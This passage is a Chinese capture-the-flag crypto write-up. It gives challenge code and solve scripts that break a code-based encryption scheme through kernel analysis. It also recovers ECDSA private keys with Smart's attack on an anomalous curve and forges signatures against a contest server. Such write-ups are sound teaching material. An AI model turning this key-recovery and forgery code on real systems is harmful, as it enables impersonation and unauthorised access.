<h3 id="▪️"><a href="#▪️" class="headerlink" title="▪️"></a>▪️</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pubkey</span>(<span class="params">n, k, l</span>):</span><br><span class="line">    <span class="comment"># L是一个长36的向量，元素由0-127的随机36个组成</span></span><br><span class="line">    L = (matrix(Permutations(n).random_element())*vector([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)])).<span class="built_in">list</span>()[:<span class="number">3</span>*l]</span><br><span class="line">    <span class="comment"># 生成一个长度为k的补0的列向量：[x^1,...,x^l,0,...,0]的转置，前l=12项非零，后k−l=72项为0</span></span><br><span class="line">    gen_col1 = <span class="keyword">lambda</span> x: [x^(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]+[<span class="number">0</span>]*(k-l)</span><br><span class="line">    <span class="comment"># 生成一个长度为k的列向量：[x^1,...,x^k]的转置</span></span><br><span class="line">    gen_col2 = <span class="keyword">lambda</span> x: [x^(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># G是84x128的矩阵，其中有36列是gen_col1生成的补0向量，这36列的位置由L决定</span></span><br><span class="line">    G = matrix(F,[gen_col1(Integer(randint(<span class="number">1</span>,p-<span class="number">1</span>))) <span class="keyword">if</span> i <span class="keyword">in</span> L <span class="keyword">else</span> gen_col2(Integer(randint(<span class="number">1</span>,p-<span class="number">1</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]).T</span><br><span class="line">    <span class="comment"># S是84x84的随机矩阵</span></span><br><span class="line">    S = random_matrix(F,k,k)</span><br><span class="line">    </span><br><span class="line">    pubkey = S*G</span><br><span class="line">    privkey = L,G</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (pubkey,privkey)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pubkey, L, message</span>):</span><br><span class="line">    <span class="comment"># 生成一个长k的随机行向量x</span></span><br><span class="line">    x = random_matrix(F,<span class="number">1</span>,k)</span><br><span class="line">    <span class="comment"># 生成一个长n的全0向量e</span></span><br><span class="line">    e = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="comment"># 随机选一个位置s∈[0, n-1]，当s不在L中时，e的位置s添加一个随机数，其中注入随机数的数量为20*(92/128)≈14.375个</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        s = randint(<span class="number">0</span>,n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> L:</span><br><span class="line">            e[s] = randint(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># c=x*S*G+m*[1,1,...,1]_n+e</span></span><br><span class="line">    c = x*pubkey+message*matrix(F,[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)])+matrix(F,e)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line">p = <span class="number">8605605879820394929871171704526267558076275882769290613301265383544615884789835912139373711919931926389028123698181386695814578808144200282148287377501923</span></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n, k, l = <span class="number">128</span>, <span class="number">84</span>, <span class="number">12</span></span><br><span class="line"></span><br><span class="line">pubkey, privkey = gen_pubkey(n,k,l)</span><br><span class="line">c = encrypt(pubkey,privkey[<span class="number">0</span>],m)</span><br><span class="line">    </span><br><span class="line">save(pubkey.<span class="built_in">list</span>(),<span class="string">&#x27;P.sobj&#x27;</span>)</span><br><span class="line">save(c.<span class="built_in">list</span>(),<span class="string">&#x27;c.sobj&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>题目首先生成了一组如下的公私钥：</p>
<p>$$pk: S*G\ sk:L,G$$</p>
<p>对于密文c</p>
<p>$$c&#x3D;x<em>pk+m</em>[1,1,…,1]_n+e$$</p>
<p>其中pk和c已知，那么对于已知的矩阵pk，可以求出其右核，即所有满足以下等式的向量<strong>y</strong>的集合（共n-k&#x3D;44个向量，每个向量长度为128）。</p>
<p>$$RKer(A)&#x3D;{\textbf{y}∈F∣A\textbf{y}&#x3D;0}$$</p>
<p>那么将<strong>y</strong>代入加密的式子中，可得到</p>
<p>$$cy_i&#x3D;m*[1,1,…,1]_n<em>y_i+e</em>y_i$$</p>
<p>对于上述式子，c、y_i已知，e长度为128，只有14个非零位，暂时先看作全0，此时只需要求解</p>
<p>$$cy_i&#x3D;m*[1,1,…,1]_n*y_i$$</p>
<p>令M&#x3D;[1,1,…,1]_n，那么可以列出向量B和向量C</p>
<p>$$B&#x3D;[M·RKer[0], M·RKer[1], …, M·RKer[43]]\ C&#x3D;[c·RKer[0], c·RKer[1], …, c·RKer[43]]\ B*m&#x3D;C$$</p>
<p>左右两侧向量已知，求解所有的m。</p>
<p>由于存在分布稀疏的错误向量e（14），右核维数为44，至少存在一个30维子空间的右核向量满足y_i与e正交（y_i*e&#x3D;0），这些都会求出相同的m，因此可以统计m的频次，出现最多的就应该是flag。</p>
<p><a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/506fe59c.html">2025-N1CTF-junior-wp-crypto | 糖醋小鸡块的blog</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">p = <span class="number">8605605879820394929871171704526267558076275882769290613301265383544615884789835912139373711919931926389028123698181386695814578808144200282148287377501923</span></span><br><span class="line">F = GF(p)</span><br><span class="line">n, k, l = <span class="number">128</span>, <span class="number">84</span>, <span class="number">12</span></span><br><span class="line"></span><br><span class="line">c = vector(F, load(<span class="string">&quot;c.sobj&quot;</span>))</span><br><span class="line">pk = Matrix(F, k, n, load(<span class="string">&quot;P.sobj&quot;</span>))</span><br><span class="line"></span><br><span class="line">dual_basis = pk.right_kernel().basis()</span><br><span class="line">M = vector(F, [<span class="number">1</span>]*n)</span><br><span class="line">candidates = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> dual_basis:</span><br><span class="line">    a = M * h</span><br><span class="line">    b = c * h</span><br><span class="line">    <span class="keyword">if</span> a != <span class="number">0</span>:</span><br><span class="line">        m_candidate = b / a</span><br><span class="line">        candidates.append(<span class="built_in">int</span>(m_candidate))  <span class="comment"># 转为 Python int 以便统计</span></span><br><span class="line"><span class="comment"># print(candidates)</span></span><br><span class="line"></span><br><span class="line">counter = Counter(candidates)</span><br><span class="line">most_common = counter.most_common(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Top candidates for m:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> val, freq <span class="keyword">in</span> most_common:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  m = <span class="subst">&#123;val&#125;</span> (freq: <span class="subst">&#123;freq&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">m = most_common[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;Us3_sQu@r3_coD3_4nD_h4ck_Th3_L&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sign-in-the-ca7s"><a href="#Sign-in-the-ca7s" class="headerlink" title="Sign in the ca7s"></a>Sign in the ca7s</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># y^2 = x^3 + 3</span></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 签名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验签</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pub, ctx, msg, sig</span>):</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r, s = sig</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n:</span><br><span class="line">        <span class="keyword">return</span> r == <span class="built_in">int</span>((<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) * (z * G + r * pub)).x()) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挑战</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params">level, flag</span>):</span><br><span class="line">    priv = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    pub = priv * G</span><br><span class="line">    msg = os.urandom(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(catalan_number(level)):</span><br><span class="line">        ctx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;context: &#x27;</span>))</span><br><span class="line">        r, s = sign(priv, ctx, msg)</span><br><span class="line">        <span class="keyword">assert</span> verify(pub, ctx, msg, (r, s))</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">1</span>: <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">2</span>: <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">3</span>: <span class="built_in">print</span>(<span class="string">&#x27;ature:&#x27;</span>, s)</span><br><span class="line">    </span><br><span class="line">    r, s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&#x27;signature: &#x27;</span>).split())</span><br><span class="line">    <span class="keyword">assert</span> verify(pub, <span class="string">b&#x27;n1junior_2025&#x27;</span>, <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode(), (r, s))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag<span class="subst">&#123;level&#125;</span>:&#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chall(<span class="number">0</span>, <span class="string">&quot;💧&quot;</span>)</span><br><span class="line">    chall(<span class="number">1</span>, <span class="string">&quot;🐱&quot;</span>)</span><br><span class="line">    chall(<span class="number">2</span>, FLAG)</span><br></pre></td></tr></table></figure>

<p>smart’s attack，当n&#x3D;&#x3D;p时可用。</p>
<p>对于level0、1利用r、s求得pub，再利用smart’s attack恢复priv，即可求得msg为cat &#x2F;flag{level}的signature。</p>
<p>$$u_1 &#x3D; z * s^{-1} \mod n\ u_2 &#x3D; r * s^{-1} \mod n\ R &#x3D; u_1 * G + u_2 * pub \ 验证：r &#x3D;&#x3D; R.x \mod n\ pub &#x3D; (u_2^{-1} \mod n) * (R - u_1 * G)\ pub &#x3D; priv * G$$</p>
<p>对于level2，需要找到两个md5值相同的字符串作为两次交互的ctx。已知r，且<code>r = int((k * G).x()) % n</code>，可利用smart‘s attack恢复k，那么根据<code>s = (pow(k, -1, n) * (z + r * priv)) % n</code>可得</p>
<p>$$s_1<em>k_1 ≡ z+r_1</em>priv \mod n \  s_2<em>k_2 ≡ z+r_2</em>priv \mod n \ &#x3D;&gt; priv ≡ (k_1<em>s_1-k_2</em>s_2) * (r_1-r_2)^{-1} \mod n$$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).xy()[<span class="number">0</span>]) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> Integer(r), Integer(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_gf_to_qq</span>(<span class="params">n, qq, x</span>):</span><br><span class="line">    <span class="keyword">return</span> ZZ(x) <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">else</span> qq(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, x.polynomial())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lift a point to the p-adic numbers.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lift</span>(<span class="params">E, p, Px, Py</span>):</span><br><span class="line">    <span class="keyword">for</span> P <span class="keyword">in</span> E.lift_x(Px, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> (P.xy()[<span class="number">1</span>] % p) == Py:</span><br><span class="line">            <span class="keyword">return</span> P</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smart_attack</span>(<span class="params">G, P</span>):</span><br><span class="line">    E = G.curve()</span><br><span class="line">    <span class="keyword">assert</span> E.trace_of_frobenius() == <span class="number">1</span>, <span class="string">f&quot;Curve should have trace of Frobenius = 1.&quot;</span></span><br><span class="line"></span><br><span class="line">    F = E.base_ring()</span><br><span class="line">    p = F.characteristic()</span><br><span class="line">    q = F.order()</span><br><span class="line">    n = F.degree()</span><br><span class="line">    qq = Qq(q, names=<span class="string">&quot;g&quot;</span>)</span><br><span class="line"></span><br><span class="line">    E = EllipticCurve(qq, [_gf_to_qq(n, qq, a) + q * ZZ.random_element(<span class="number">1</span>, q) <span class="keyword">for</span> a <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line">    Gx, Gy = _gf_to_qq(n, qq, G.xy()[<span class="number">0</span>]), _gf_to_qq(n, qq, G.xy()[<span class="number">1</span>])</span><br><span class="line">    Gx, Gy = (q * _lift(E, p, Gx, Gy)).xy()</span><br><span class="line">    Px, Py = _gf_to_qq(n, qq, P.xy()[<span class="number">0</span>]), _gf_to_qq(n, qq, P.xy()[<span class="number">1</span>])</span><br><span class="line">    Px, Py = (q * _lift(E, p, Px, Py)).xy()</span><br><span class="line">    l = ZZ(((Px / Py) / (Gx / Gy)) % p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        G0 = p ** (n - <span class="number">1</span>) * G</span><br><span class="line">        G0x, G0y = _gf_to_qq(n, qq, G0.xy()[<span class="number">0</span>]), _gf_to_qq(n, qq, G0.xy()[<span class="number">1</span>])</span><br><span class="line">        G0x, G0y = (q * _lift(E, p, G0x, G0y)).xy()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">            Pi = p ** (n - i - <span class="number">1</span>) * (P - l * G)</span><br><span class="line">            <span class="keyword">if</span> Pi.is_zero():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            Pix, Piy = _gf_to_qq(n, qq, Pi.xy()[<span class="number">0</span>]), _gf_to_qq(n, qq, Pi.xy()[<span class="number">1</span>])</span><br><span class="line">            Pix, Piy = (q * _lift(E, p, Pix, Piy)).xy()</span><br><span class="line">            l += p ** i * ZZ(((Pix / Piy) / (G0x / G0y)) % p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve1</span>(<span class="params">r, s, ctx, msg, level</span>):</span><br><span class="line">    P = E.lift_x(r, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> point <span class="keyword">in</span> P:</span><br><span class="line">        k = smart_attack(G, point)</span><br><span class="line">        ks = long_to_bytes(k)</span><br><span class="line">        <span class="keyword">if</span> ks[:<span class="built_in">len</span>(ctx)] == ctx:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    recover_priv = Integer((s * k - z) * inverse(r, n) % n)</span><br><span class="line"></span><br><span class="line">    ctx = <span class="string">b&quot;n1junior_2025&quot;</span></span><br><span class="line">    msg = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r, s = sign(recover_priv, ctx, msg)</span><br><span class="line">    <span class="keyword">return</span> r, s, recover_priv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve2</span>(<span class="params">recover_priv, level</span>):</span><br><span class="line">    ctx = <span class="string">b&quot;n1junior_2025&quot;</span></span><br><span class="line">    msg = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r, s = sign(recover_priv, ctx, msg)</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">ip = <span class="string">&quot;60.205.163.215&quot;</span></span><br><span class="line">port = <span class="number">15677</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        io = process([<span class="string">&quot;sage&quot;</span>, <span class="string">&quot;server1.sage&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip, <span class="built_in">int</span>(port))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#solve level0</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;context: &quot;</span>)</span><br><span class="line">    ctx = unhexlify(<span class="string">b&quot;1122&quot;</span>)</span><br><span class="line">    io.sendline(ctx.<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;message: &quot;</span>)</span><br><span class="line">    msg = unhexlify(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;sign: &quot;</span>)</span><br><span class="line">    r = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;ature: &quot;</span>)</span><br><span class="line">    s = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    r, s, priv = solve1(r, s, ctx, msg, <span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;signature: &quot;</span>)</span><br><span class="line">    sig = <span class="string">f&quot;<span class="subst">&#123;r&#125;</span> <span class="subst">&#123;s&#125;</span>&quot;</span>.encode()</span><br><span class="line">    io.sendline(sig)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;flag0:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#solve level1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;context: &quot;</span>)</span><br><span class="line">    ctx = unhexlify(<span class="string">b&quot;1122&quot;</span>)</span><br><span class="line">    io.sendline(ctx.<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;message: &quot;</span>)</span><br><span class="line">    msg = unhexlify(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;sign: &quot;</span>)</span><br><span class="line">    r = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;ature: &quot;</span>)</span><br><span class="line">    s = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    r, s, priv = solve1(r, s, ctx, msg, <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;signature: &quot;</span>)</span><br><span class="line">    sig = <span class="string">f&quot;<span class="subst">&#123;r&#125;</span> <span class="subst">&#123;s&#125;</span>&quot;</span>.encode()</span><br><span class="line">    io.sendline(sig)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;flag1:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">    <span class="comment">#solve level2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        ctx1 = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        ctx2 = f.read()</span><br><span class="line"></span><br><span 